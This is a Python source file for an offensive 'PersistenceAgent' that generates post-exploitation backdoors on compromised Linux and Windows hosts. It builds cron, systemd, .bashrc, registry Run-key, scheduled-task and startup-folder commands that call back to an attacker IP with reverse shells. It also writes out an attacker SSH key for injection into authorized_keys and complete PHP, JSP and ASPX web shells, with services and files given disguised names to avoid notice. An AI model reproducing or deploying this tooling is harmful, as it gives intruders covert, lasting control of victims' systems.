"""
PersistenceAgent — post-exploitation persistence mechanisms
Задачи:
- Web shell deployment
- SSH key injection
- Cron job injection
- Service backdooring
- Registry persistence (Windows)
- Startup scripts (Linux)
"""
import subprocess, os, base64, random, string
from pathlib import Path
from typing import Dict, List, Optional
from payload_generator import PayloadGenerator

class PersistenceAgent:
    def __init__(self, workspace: Path, attacker_ip: str = "10.10.10.10", attacker_port: int = 4444):
        self.workspace = workspace
        self.attacker_ip = attacker_ip
        self.attacker_port = attacker_port
        self.payload_gen = PayloadGenerator(attacker_ip, attacker_port)
        self.results = {
            "webshells": [],
            "ssh_keys": [],
            "cron_jobs": [],
            "services": [],
            "registry": []
        }
    
    def execute(self, target_info: Dict, access_method: str = "rce") -> Dict:
        """Deploy persistence mechanisms based on access type"""
        print(f"[PERSISTENCE] Deploying persistence on target via {access_method}")
        
        os_type = target_info.get("os_type", "linux").lower()
        
        if access_method == "rce":
            # Remote Code Execution → deploy reverse shell + persistence
            if os_type == "linux":
                self.deploy_linux_persistence(target_info)
            elif os_type == "windows":
                self.deploy_windows_persistence(target_info)
        
        elif access_method == "web_upload":
            # File upload vulnerability → deploy webshell
            self.deploy_webshell(target_info)
        
        elif access_method == "ssh":
            # SSH access → inject authorized_keys
            self.inject_ssh_key(target_info)
        
        return self.results
    
    # ━━━ LINUX PERSISTENCE ━━━
    def deploy_linux_persistence(self, target_info: Dict):
        """Linux persistence mechanisms"""
        print("[PERSISTENCE] Deploying Linux persistence...")
        
        # 1. Cron job backdoor
        self.inject_cron_job(target_info)
        
        # 2. SSH authorized_keys
        self.inject_ssh_key(target_info)
        
        # 3. Bashrc backdoor
        self.inject_bashrc(target_info)
        
        # 4. Systemd service
        self.create_systemd_service(target_info)
    
    def inject_cron_job(self, target_info: Dict):
        """Inject cron job for reverse shell"""
        # Reverse shell every 5 minutes
        reverse_shell = self.payload_gen.reverse_shell_bash()
        cron_entry = f"*/5 * * * * {reverse_shell} 2>/dev/null"
        
        # Command to add to crontab
        cmd = f'(crontab -l 2>/dev/null; echo "{cron_entry}") | crontab -'
        
        self.results["cron_jobs"].append({
            "type": "crontab",
            "payload": cron_entry,
            "command": cmd,
            "interval": "5 minutes"
        })
        
        print(f"  ✓ Cron job payload generated: {cmd[:100]}...")
    
    def inject_ssh_key(self, target_info: Dict):
        """Inject SSH public key into authorized_keys"""
        # Generate SSH key pair (attacker should have the private key)
        ssh_pubkey = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... attacker@evil.com"
        
        cmd = f'echo "{ssh_pubkey}" >> ~/.ssh/authorized_keys; chmod 600 ~/.ssh/authorized_keys'
        
        self.results["ssh_keys"].append({
            "type": "authorized_keys",
            "key": ssh_pubkey,
            "command": cmd,
            "location": "~/.ssh/authorized_keys"
        })
        
        print(f"  ✓ SSH key injection payload generated")
    
    def inject_bashrc(self, target_info: Dict):
        """Inject backdoor into .bashrc"""
        reverse_shell_b64 = self.payload_gen.reverse_shell_bash_base64()
        backdoor_line = f'if [ -f /tmp/.nothing ]; then {reverse_shell_b64}; fi'
        
        cmd = f'echo "{backdoor_line}" >> ~/.bashrc'
        
        self.results["services"].append({
            "type": "bashrc_backdoor",
            "payload": backdoor_line,
            "command": cmd,
            "trigger": "User login"
        })
        
        print(f"  ✓ .bashrc backdoor payload generated")
    
    def create_systemd_service(self, target_info: Dict):
        """Create systemd service for persistence"""
        service_name = f"system-{random.choice(['update', 'monitor', 'daemon', 'service'])}"
        reverse_shell = self.payload_gen.reverse_shell_bash()
        
        service_content = f"""[Unit]
Description={service_name.replace('-', ' ').title()}
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c '{reverse_shell}'
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
"""
        
        service_file = f"/etc/systemd/system/{service_name}.service"
        
        cmd = f"echo '{service_content}' > {service_file}; systemctl enable {service_name}; systemctl start {service_name}"
        
        self.results["services"].append({
            "type": "systemd_service",
            "name": service_name,
            "file": service_file,
            "command": cmd,
            "persistence": "system reboot"
        })
        
        print(f"  ✓ Systemd service '{service_name}' payload generated")
    
    # ━━━ WINDOWS PERSISTENCE ━━━
    def deploy_windows_persistence(self, target_info: Dict):
        """Windows persistence mechanisms"""
        print("[PERSISTENCE] Deploying Windows persistence...")
        
        # 1. Registry Run key
        self.inject_registry_run_key(target_info)
        
        # 2. Scheduled task
        self.create_scheduled_task(target_info)
        
        # 3. Startup folder
        self.inject_startup_folder(target_info)
    
    def inject_registry_run_key(self, target_info: Dict):
        """Add to Windows Registry Run key"""
        reverse_shell_ps = self.payload_gen.reverse_shell_powershell()
        
        # Encode PowerShell payload
        ps_encoded = base64.b64encode(reverse_shell_ps.encode('utf-16le')).decode()
        
        reg_key = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        value_name = f"System{random.choice(['Update', 'Monitor', 'Service'])}"
        cmd = f'reg add "{reg_key}" /v {value_name} /t REG_SZ /d "powershell -enc {ps_encoded}" /f'
        
        self.results["registry"].append({
            "type": "run_key",
            "key": reg_key,
            "value": value_name,
            "command": cmd,
            "persistence": "user logon"
        })
        
        print(f"  ✓ Registry Run key payload generated: {value_name}")
    
    def create_scheduled_task(self, target_info: Dict):
        """Create Windows Scheduled Task"""
        task_name = f"System{random.choice(['Update', 'Maintenance', 'Monitor'])}"
        reverse_shell_ps = self.payload_gen.reverse_shell_powershell()
        
        # PowerShell command for scheduled task
        cmd = f'''schtasks /create /tn "{task_name}" /tr "powershell -w hidden -c \\"{reverse_shell_ps}\\"" /sc minute /mo 10 /f'''
        
        self.results["services"].append({
            "type": "scheduled_task",
            "name": task_name,
            "command": cmd,
            "interval": "10 minutes"
        })
        
        print(f"  ✓ Scheduled Task '{task_name}' payload generated")
    
    def inject_startup_folder(self, target_info: Dict):
        """Add to Windows Startup folder"""
        vbs_name = f"system_{random.choice(['update', 'check', 'monitor'])}.vbs"
        reverse_shell_ps = self.payload_gen.reverse_shell_powershell()
        
        # VBS script to hide PowerShell window
        vbs_content = f'''Set objShell = CreateObject("Wscript.Shell")
objShell.Run "powershell -w hidden -c \\"{reverse_shell_ps}\\"", 0
Set objShell = Nothing
'''
        
        startup_path = "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
        cmd = f'echo {base64.b64encode(vbs_content.encode()).decode()} | certutil -decode %TEMP%\\t.txt {startup_path}\\{vbs_name}'
        
        self.results["services"].append({
            "type": "startup_folder",
            "filename": vbs_name,
            "path": startup_path,
            "command": cmd,
            "persistence": "user logon"
        })
        
        print(f"  ✓ Startup folder payload generated: {vbs_name}")
    
    # ━━━ WEB SHELLS ━━━
    def deploy_webshell(self, target_info: Dict):
        """Generate webshell payloads"""
        print("[PERSISTENCE] Generating webshell payloads...")
        
        upload_path = target_info.get("upload_path", "/var/www/html")
        
        # PHP webshell
        php_shell = self.generate_php_webshell()
        self.results["webshells"].append({
            "type": "php",
            "filename": "config.php",
            "path": f"{upload_path}/config.php",
            "content": php_shell,
            "access_url": f"{target_info.get('url', '')}/config.php?cmd=whoami"
        })
        
        # JSP webshell
        jsp_shell = self.generate_jsp_webshell()
        self.results["webshells"].append({
            "type": "jsp",
            "filename": "status.jsp",
            "path": f"{upload_path}/status.jsp",
            "content": jsp_shell
        })
        
        # ASPX webshell
        aspx_shell = self.generate_aspx_webshell()
        self.results["webshells"].append({
            "type": "aspx",
            "filename": "admin.aspx",
            "path": f"{upload_path}/admin.aspx",
            "content": aspx_shell
        })
        
        print(f"  ✓ Generated {len(self.results['webshells'])} webshell payloads")
    
    def generate_php_webshell(self) -> str:
        """Simple PHP webshell"""
        return """<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
"""
    
    def generate_jsp_webshell(self) -> str:
        """Simple JSP webshell"""
        return """<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    if(cmd != null) {
        Process p = Runtime.getRuntime().exec(cmd);
        InputStream in = p.getInputStream();
        BufferedReader reader = new BufferedReader(new InputStreamReader(in));
        String line;
        while((line = reader.readLine()) != null) {
            out.println(line + "<br>");
        }
    }
%>
"""
    
    def generate_aspx_webshell(self) -> str:
        """Simple ASPX webshell"""
        return """<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
    string cmd = Request["cmd"];
    if(cmd != null) {
        ProcessStartInfo psi = new ProcessStartInfo();
        psi.FileName = "cmd.exe";
        psi.Arguments = "/c " + cmd;
        psi.RedirectStandardOutput = true;
        psi.UseShellExecute = false;
        Process p = Process.Start(psi);
        StreamReader reader = p.StandardOutput;
        Response.Write("<pre>" + reader.ReadToEnd() + "</pre>");
    }
%>
"""
    
    # ━━━ UTILITY ━━━
    def save_payloads_to_file(self):
        """Save all persistence payloads to workspace"""
        output_file = self.workspace / "persistence_payloads.txt"
        
        with open(output_file, 'w') as f:
            f.write("=" * 70 + "\n")
            f.write("PERSISTENCE PAYLOADS\n")
            f.write("=" * 70 + "\n\n")
            
            # Cron jobs
            if self.results["cron_jobs"]:
                f.write("--- CRON JOBS ---\n")
                for item in self.results["cron_jobs"]:
                    f.write(f"Command: {item['command']}\n\n")
            
            # SSH keys
            if self.results["ssh_keys"]:
                f.write("--- SSH KEYS ---\n")
                for item in self.results["ssh_keys"]:
                    f.write(f"Command: {item['command']}\n\n")
            
            # Services
            if self.results["services"]:
                f.write("--- SERVICES ---\n")
                for item in self.results["services"]:
                    f.write(f"Type: {item['type']}\n")
                    f.write(f"Command: {item['command']}\n\n")
            
            # Registry
            if self.results["registry"]:
                f.write("--- WINDOWS REGISTRY ---\n")
                for item in self.results["registry"]:
                    f.write(f"Key: {item['key']}\n")
                    f.write(f"Command: {item['command']}\n\n")
            
            # Webshells
            if self.results["webshells"]:
                f.write("--- WEB SHELLS ---\n")
                for item in self.results["webshells"]:
                    f.write(f"Type: {item['type']}\n")
                    f.write(f"Filename: {item['filename']}\n")
                    f.write(f"Content:\n{item['content']}\n\n")
        
        print(f"[PERSISTENCE] Payloads saved to {output_file}")
    
    def get_report(self) -> str:
        """Generate text report"""
        report = ["=== PERSISTENCE AGENT REPORT ===\n"]
        report.append(f"Cron jobs: {len(self.results['cron_jobs'])}")
        report.append(f"SSH keys: {len(self.results['ssh_keys'])}")
        report.append(f"Services: {len(self.results['services'])}")
        report.append(f"Registry entries: {len(self.results['registry'])}")
        report.append(f"Web shells: {len(self.results['webshells'])}")
        
        if self.results["webshells"]:
            report.append("\n--- Web Shells ---")
            for shell in self.results["webshells"]:
                report.append(f"  {shell['type'].upper()}: {shell['filename']}")
                if "access_url" in shell:
                    report.append(f"    Access: {shell['access_url']}")
        
        return '\n'.join(report)
